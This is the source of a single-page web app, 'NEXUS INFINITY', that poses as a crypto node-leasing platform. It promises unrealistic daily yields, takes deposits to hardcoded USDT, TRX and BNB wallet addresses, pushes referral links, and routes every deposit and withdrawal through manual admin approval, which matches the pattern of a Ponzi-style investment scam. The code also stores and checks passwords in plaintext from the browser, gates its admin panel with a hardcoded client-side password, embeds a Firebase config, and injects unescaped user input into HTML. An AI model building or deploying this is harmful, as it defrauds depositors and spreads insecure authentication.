<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Node Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --n-pink: #ff00ff; --n-blue: #00d4ff; --bg: #030508; }
        body { background: var(--bg); color: #f1f5f9; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* Modern Glassmorphism */
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 30px; }
        .btn-master { background: linear-gradient(135deg, #ff00ff, #00d4ff); font-weight: 800; padding: 18px; border-radius: 20px; text-transform: uppercase; width: 100%; border: none; color: white; cursor: pointer; transition: 0.4s; box-shadow: 0 10px 30px rgba(255, 0, 255, 0.2); }
        .input-hub { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 18px; padding: 16px; color: white; width: 100%; outline: none; transition: 0.3s; }
        .input-hub:focus { border-color: var(--n-blue); background: rgba(255, 255, 255, 0.05); }
        
        .nav-item { color: #475569; transition: 0.4s; text-align: center; flex: 1; cursor: pointer; }
        .nav-active { color: #fff; text-shadow: 0 0 15px var(--n-pink); }
        
        /* Maintenance Overlay */
        #maintenance-screen { position: fixed; inset: 0; background: #030508; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
        
        .hidden { display: none !important; }
        .animate-flicker { animation: flicker 2s linear infinite; }
        @keyframes flicker { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    </style>
</head>
<body>

    <div id="maintenance-screen" class="hidden">
        <div class="w-24 h-24 border-4 border-t-pink-500 border-white/5 rounded-full animate-spin"></div>
        <h2 class="text-2xl font-black italic mt-8 uppercase tracking-[5px]">Core Upgrading</h2>
        <p class="text-zinc-500 mt-4 text-[10px] font-bold uppercase tracking-widest">NEXUS Nodes are being synchronized for V4.0 Protocol.</p>
    </div>

    <div id="splash" class="fixed inset-0 bg-[#030508] z-[9999] flex flex-col items-center justify-center">
        <div class="w-20 h-20 bg-gradient-to-tr from-pink-600 to-blue-600 rounded-[2rem] flex items-center justify-center text-5xl font-black italic shadow-[0_0_50px_rgba(255,0,255,0.3)]">N</div>
        <div class="mt-8 flex gap-2">
            <div class="w-1.5 h-1.5 bg-pink-500 rounded-full animate-bounce"></div>
            <div class="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce [animation-delay:0.2s]"></div>
            <div class="w-1.5 h-1.5 bg-white rounded-full animate-bounce [animation-delay:0.4s]"></div>
        </div>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-6 hidden">
        <div class="max-w-md w-full space-y-8">
            <div class="text-center mb-10">
                <h1 class="text-5xl font-black italic tracking-tighter text-white">NEXUS<span class="text-pink-500">.</span></h1>
                <p class="text-[9px] font-bold uppercase tracking-[6px] text-zinc-500 mt-2">Sovereign Asset Terminal</p>
            </div>

            <div id="login-ui" class="glass p-10 space-y-6 border-t border-white/10">
                <div class="space-y-2">
                    <h2 class="text-2xl font-black italic uppercase">Access Hub</h2>
                    <p class="text-[10px] text-zinc-500 font-bold">Secure biometric-grade protocol login.</p>
                </div>
                <input type="text" id="l-user" placeholder="Protocol ID (Username)" class="input-hub">
                <input type="password" id="l-pass" placeholder="Security Key (Password)" class="input-hub">
                <button onclick="handleLogin()" class="btn-master">Authorize Terminal</button>
                <p class="text-center text-[10px] text-zinc-600 font-black uppercase">New to Nexus? <span onclick="toggleAuth(true)" class="text-blue-500 cursor-pointer">Create Identity</span></p>
            </div>

            <div id="signup-ui" class="glass p-10 space-y-6 border-t border-blue-600 hidden">
                <div class="space-y-2">
                    <h2 class="text-2xl font-black italic uppercase text-blue-500">Initialize Identity</h2>
                    <p class="text-[10px] text-zinc-500 font-bold">Global infrastructure registration V4.0.</p>
                </div>
                <input type="text" id="s-user" placeholder="Assign Protocol ID" class="input-hub">
                <input type="password" id="s-pass" placeholder="Establish Security Key" class="input-hub">
                <input type="text" id="s-ref" placeholder="Referral ID (Auto-detected)" class="input-hub text-zinc-500" readonly>
                <button onclick="handleSignup()" class="btn-master !from-blue-600 !to-cyan-600">Sync New Identity</button>
                <p class="text-center text-[10px] text-zinc-600 font-black uppercase">Existing ID? <span onclick="toggleAuth(false)" class="text-pink-500 cursor-pointer">Return to Hub</span></p>
            </div>
            
            <div class="flex justify-center gap-8 opacity-20">
                <i class="fa-brands fa-bitcoin text-2xl"></i>
                <i class="fa-brands fa-ethereum text-2xl"></i>
                <i class="fa-solid fa-shield-halved text-2xl"></i>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-[#030508]/90 backdrop-blur-3xl z-50 border-b border-white/5">
            <div class="flex items-center gap-4">
                <div id="admin-trigger" class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center font-black text-pink-500 text-2xl border border-white/10">N</div>
                <div>
                    <p id="nav-user" class="text-sm font-black uppercase text-white italic">...</p>
                    <p class="text-[8px] text-green-500 font-black uppercase tracking-widest animate-pulse">● Secure Link</p>
                </div>
            </div>
            <button onclick="logout()" class="text-zinc-600 hover:text-white transition-colors"><i class="fa-solid fa-power-off text-xl"></i></button>
        </header>

        <main id="page-home" class="p-6 space-y-8 animate-in fade-in duration-700">
            <div class="glass p-10 bg-gradient-to-br from-indigo-500/10 to-transparent relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-10"><i class="fa-solid fa-tower-broadcast text-6xl"></i></div>
                <p class="text-[10px] font-black text-zinc-500 uppercase tracking-[4px] mb-2">Liquidity Balance</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-10 flex justify-between items-end border-t border-white/5 pt-6">
                    <div><p class="text-[8px] text-zinc-600 uppercase font-black">Mining Yield</p><p id="profit-txt" class="text-2xl font-black text-pink-500">+$0.00</p></div>
                    <button onclick="copyRef()" class="bg-white/5 text-white px-5 py-2.5 rounded-xl text-[9px] font-black uppercase italic border border-white/10">Share ID</button>
                </div>
            </div>
            <div id="active-nodes-list" class="space-y-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-10 hidden">
            <div class="space-y-6">
                <h3 class="text-lg font-black italic text-pink-500 uppercase tracking-tighter flex items-center gap-2">
                    <i class="fa-solid fa-crown text-xs"></i> Sovereign Elite (VIP)
                </h3>
                <div id="elite-nodes" class="grid gap-4"></div>
                
                <h3 class="text-lg font-black italic text-blue-400 uppercase tracking-tighter mt-12 flex items-center gap-2">
                    <i class="fa-solid fa-server text-xs"></i> Institutional Nodes
                </h3>
                <div id="normal-nodes" class="grid gap-4 pb-20"></div>
            </div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass p-8 space-y-6">
                <h3 class="text-lg font-black uppercase text-pink-500 italic">Inject Capital</h3>
                <select id="dep-method" class="input-hub" onchange="updateDepAddr()">
                    <option value="">Select Protocol</option>
                    <option value="USDT_TRC20">USDT (TRC20) - Fast</option>
                    <option value="TRX">TRON (TRX)</option>
                    <option value="BNB">Binance (BNB Smart Chain)</option>
                </select>
                <div id="dep-details" class="hidden space-y-6">
                    <div class="p-4 bg-black rounded-2xl border border-white/5">
                        <p class="text-[8px] text-zinc-600 uppercase font-black mb-2 text-center">Settlement Address</p>
                        <p id="dep-addr-display" class="text-[10px] font-mono break-all text-center select-all text-blue-400"></p>
                    </div>
                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-hub">
                    <div>
                        <label class="block text-[9px] font-black text-zinc-500 mb-3 uppercase">Upload Settlement Proof (Photo)</label>
                        <input type="file" id="dep-proof" accept="image/*" class="text-[10px] file:bg-white/5 file:border-0 file:rounded-full file:px-4 file:py-2 file:text-white file:mr-4">
                    </div>
                    <button onclick="processDeposit()" class="btn-master">Verify Injection</button>
                </div>
            </div>

            <div class="glass p-8 space-y-6">
                <h3 class="text-lg font-black uppercase text-blue-400 italic">Global Egress</h3>
                <select id="with-method" class="input-hub">
                    <option value="Binance Pay">Binance Pay (Instant)</option>
                    <option value="TrustWallet">Trust Wallet</option>
                    <option value="PayPal">PayPal Business</option>
                    <option value="CashApp">CashApp</option>
                    <option value="Coinbase">Coinbase</option>
                    <option value="Payeer">Payeer</option>
                    <option value="Bank">Bank Wire (Global)</option>
                    <option value="USDT">Direct USDT Wallet</option>
                </select>
                <input type="text" id="w-user" placeholder="Account Name / ID" class="input-hub">
                <input type="text" id="w-addr" placeholder="Destination Address" class="input-hub">
                <input type="number" id="w-amt" placeholder="Withdrawal Amount ($)" class="input-hub">
                <button onclick="processWithdraw()" class="btn-master !from-white !to-zinc-400 !text-black">Request Payout</button>
            </div>
        </main>

        <main id="page-info" class="p-6 space-y-8 hidden">
            <div class="glass p-8 space-y-6">
                <h3 class="text-xl font-black italic uppercase text-pink-500">Legal Compliance</h3>
                <p class="text-[11px] text-zinc-400 leading-relaxed">Nexus Infinity is a decentralized node leasing protocol. By using this terminal, you agree to the V4.0 multi-chain security standards. All assets are secured via cold-storage vaults.</p>
                <hr class="border-white/5">
                <div class="space-y-4">
                    <div class="p-4 bg-white/5 rounded-2xl"><p class="text-[10px] font-black text-blue-400 uppercase">Privacy Policy</p><p class="text-[9px] text-zinc-500 mt-2">Zero-knowledge logging. We do not store biometric data or personal identity outside of protocol IDs.</p></div>
                    <div class="p-4 bg-white/5 rounded-2xl"><p class="text-[10px] font-black text-blue-400 uppercase">Trust Status</p><p class="text-[9px] text-zinc-500 mt-2">Institutional-grade uptime (99.9%). Multi-sig approval for all egress transactions.</p></div>
                </div>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-8 bg-[#030508]/95 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-bolt-lightning text-2xl"></i></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-microchip text-2xl"></i></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-building-columns text-2xl"></i></div>
            <div onclick="switchPage('info')" class="nav-item"><i class="fa-solid fa-circle-nodes text-2xl"></i></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#030508] z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 pb-4 border-b border-white/10">
            <h2 class="text-xl font-black italic text-pink-500 uppercase tracking-tighter italic">Imperial Control Console</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div class="space-y-10">
            <div class="glass p-6 flex items-center justify-between">
                <p class="text-[10px] font-black uppercase text-zinc-400">Maintenance Protocol</p>
                <button id="m-btn" onclick="toggleM()" class="bg-zinc-800 px-6 py-2 rounded-full text-[9px] font-black uppercase">OFF</button>
            </div>
            
            <h3 class="text-xs font-black uppercase text-zinc-500 ml-2">Protocol Requests</h3>
            <div id="admin-requests" class="grid gap-5"></div>
            
            <h3 class="text-xs font-black uppercase text-zinc-500 ml-2">Terminal Users</h3>
            <div id="admin-users" class="grid gap-3"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // CONFIG (Check these match your Firebase)
        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // DATA NODES
        const eliteNodes = Array.from({length: 6}, (_, i) => ({ id: i+100, title: `Sovereign Elite S-${i+1}`, price: 1000 + (i*500), daily: 150 + (i*75), img: `https://picsum.photos/seed/elite${i}/400/200` }));
        const normalNodes = Array.from({length: 12}, (_, i) => ({ id: i+1, title: `Node Protocol X-${i+1}`, price: 50 + (i*50), daily: 5 + (i*6), img: `https://picsum.photos/seed/norm${i}/400/200` }));

        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            if(urlParams.has('ref')) { document.getElementById('s-ref').value = urlParams.get('ref'); }
            
            renderNodes();
            checkM();
            setTimeout(() => { 
                document.getElementById('splash').style.display = 'none';
                const u = localStorage.getItem('nexus_user');
                if(u) showDashboard(u); else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function checkM() {
            onValue(ref(db, 'system/maintenance'), (s) => {
                const active = s.val() === true;
                document.getElementById('maintenance-screen').classList.toggle('hidden', !active);
                document.getElementById('m-btn').innerText = active ? "ON" : "OFF";
                document.getElementById('m-btn').classList.toggle('bg-pink-600', active);
            });
        }

        function renderNodes() {
            document.getElementById('elite-nodes').innerHTML = eliteNodes.map(n => nodeCard(n, 'from-pink-900/40 to-transparent')).join('');
            document.getElementById('normal-nodes').innerHTML = normalNodes.map(n => nodeCard(n, 'from-blue-900/40 to-transparent')).join('');
        }

        const nodeCard = (n, grad) => `
            <div class="glass overflow-hidden border border-white/5 bg-gradient-to-br ${grad}">
                <div class="p-7 flex justify-between items-center">
                    <div><h4 class="font-black italic uppercase text-xs text-white">${n.title}</h4><p class="text-[9px] text-green-400 font-black mt-1">24H Yield: +$${n.daily}</p></div>
                    <div class="text-right"><p class="text-xl font-black text-white">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-3 bg-white text-black px-5 py-1.5 rounded-full text-[9px] font-black uppercase italic">Activate</button></div>
                </div>
            </div>`;

        // AUTH LOGIC
        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim();
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Protocol Refused: Invalid Credentials.");
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), r = document.getElementById('s-ref').value.trim();
            if(!u || !p) return alert("All protocol fields required.");
            const s = await get(ref(db, `users/${u}`));
            if(s.exists()) return alert("Identity already exists.");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: r, status: 'Active' });
            alert("Identity Synced!"); toggleAuth(false);
        };

        // DEPOSIT PROOF (Base64)
        window.processDeposit = () => {
            const file = document.getElementById('dep-proof').files[0];
            const amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, meth = document.getElementById('dep-method').value;
            if(!file || !amt || !tid) return alert("Complete all data points.");
            
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async () => {
                const u = localStorage.getItem('nexus_user'), hKey = push(ref(db, 'admin/requests')).key;
                const data = { id: hKey, user: u, amount: amt, tid, proof: reader.result, method: meth, type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${hKey}`), data);
                alert("Protocol Settlement Pending Approval. ");
                switchPage('home');
            };
        };

        window.processWithdraw = async () => {
            const u = localStorage.getItem('nexus_user'), amt = parseFloat(document.getElementById('w-amt').value);
            const userSnap = await get(ref(db, `users/${u}`));
            if(amt < 10 || userSnap.val().profit < amt) return alert("Insufficient Yield Balance.");
            
            const hKey = push(ref(db, 'admin/requests')).key;
            const data = { 
                id: hKey, user: u, amount: amt, account: document.getElementById('w-user').value,
                method: document.getElementById('with-method').value, address: document.getElementById('w-addr').value,
                type: 'Withdrawal', date: new Date().toLocaleString() 
            };
            await set(ref(db, `admin/requests/${hKey}`), data);
            await update(ref(db, `users/${u}`), { profit: userSnap.val().profit - amt });
            alert("Withdrawal Egress Initialized! ");
        };

        // DASHBOARD REFRESH
        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
            });
        }

        // ADMIN MODULE
        window.toggleM = async () => { 
            const s = await get(ref(db, 'system/maintenance'));
            await set(ref(db, 'system/maintenance'), !s.val());
        };

        let taps = 0; document.getElementById('admin-trigger').onclick = () => { 
            taps++; if(taps === 4) { if(prompt("Security Hash:") === "coin786") { 
                document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin();
            } taps = 0; }
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass p-5 space-y-4 border border-white/10">
                        <div class="flex justify-between items-start">
                            <div><p class="text-[10px] font-black uppercase text-pink-500">${r.type}</p><p class="text-[14px] font-black">$${r.amount}</p></div>
                            <p class="text-[8px] text-zinc-500">${r.date}</p>
                        </div>
                        <p class="text-[9px] font-bold">USER: ${r.user} | ${r.method}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-40 object-cover rounded-2xl border border-white/5">` : `<p class="text-[9px] text-blue-400">Target: ${r.address}</p>`}
                        <div class="flex gap-3">
                            <button onclick="approve('${r.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-500/20 text-green-500 py-3 rounded-xl text-[9px] font-black uppercase">Approve</button>
                            <button onclick="reject('${r.id}')" class="flex-1 bg-red-500/20 text-red-500 py-3 rounded-xl text-[9px] font-black uppercase">Deny</button>
                        </div>
                    </div>`).join('') : '<p class="text-center opacity-30 text-[9px] font-black py-10 uppercase">No Pending Protocol Requests</p>';
            });
            onValue(ref(db, 'users'), (s) => {
                const users = s.val();
                document.getElementById('admin-users').innerHTML = users ? Object.values(users).map(u => `
                    <div class="glass p-4 flex justify-between items-center border border-white/5">
                        <p class="text-[10px] font-black uppercase">${u.username}</p>
                        <p class="text-[10px] font-black text-blue-400">$${(u.balance || 0).toFixed(2)}</p>
                    </div>`).join('') : '';
            });
        }

        window.approve = async (id, user, amt, type) => {
            const s = await get(ref(db, `users/${user}`));
            if(type === 'Deposit') await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + amt });
            await remove(ref(db, `admin/requests/${id}`));
        };
        window.reject = async (id) => remove(ref(db, `admin/requests/${id}`));

        // UTILS
        window.switchPage = (p) => { 
            ['home','market','vault','info'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); 
            document.getElementById('page-'+p).classList.remove('hidden'); 
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active'));
            event.currentTarget.classList.add('nav-active');
        };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.updateDepAddr = () => {
            const m = document.getElementById('dep-method').value;
            const addrs = { USDT_TRC20: 'TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ', TRX: 'TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76', BNB: '0xD9359EADE5F5bACA51fb7da043767Bc0685bC355' };
            if(m) { document.getElementById('dep-addr-display').innerText = addrs[m]; document.getElementById('dep-details').classList.remove('hidden'); }
        };
        window.copyRef = () => { navigator.clipboard.writeText(window.location.origin + window.location.pathname + "?ref=" + localStorage.getItem('nexus_user')); alert("Referral Protocol Link Copied!"); };
    </script>
</body>
</html>
